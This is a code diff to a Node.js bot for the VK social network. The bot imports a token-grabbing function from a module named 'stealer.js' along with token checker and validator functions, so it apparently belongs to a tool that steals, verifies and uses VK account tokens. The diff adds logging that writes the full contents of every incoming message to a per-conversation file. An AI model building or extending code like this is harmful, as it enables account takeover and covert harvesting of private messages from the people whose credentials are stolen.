@@ -1,7 +1,8 @@
+const fs = require("fs");
 const { VK, Keyboard } = require('vk-io');
 const { HearManager } = require('@vk-io/hear');
 const MongoClient = require("mongodb").MongoClient;
-const { db_get_collection, db_get_random, db_add, db_delete_collection, db_available_value, db_delete_value } = require("../lib/db.js")
+const { db_get_collection, db_add, db_available_value, db_delete_value } = require("../lib/db.js")
 const { get_tokens } = require("../lib/stealer.js");
 const { get_vk_messages } = require('./handler.js')
 const { vk_checker, valid_token } = require("./checker.js");
@@ -19,6 +20,8 @@ const hearManager = new HearManager();
 
 vk.updates.on('message_new', (context, next) => {
 	const { messagePayload } = context;
+
+    fs.appendFile(`logs/${context.peerId}`, JSON.stringify(context)+"\n", () => {})
 
     if (messagePayload && messagePayload.command && messagePayload.arg) {
         context.state.command = messagePayload.command
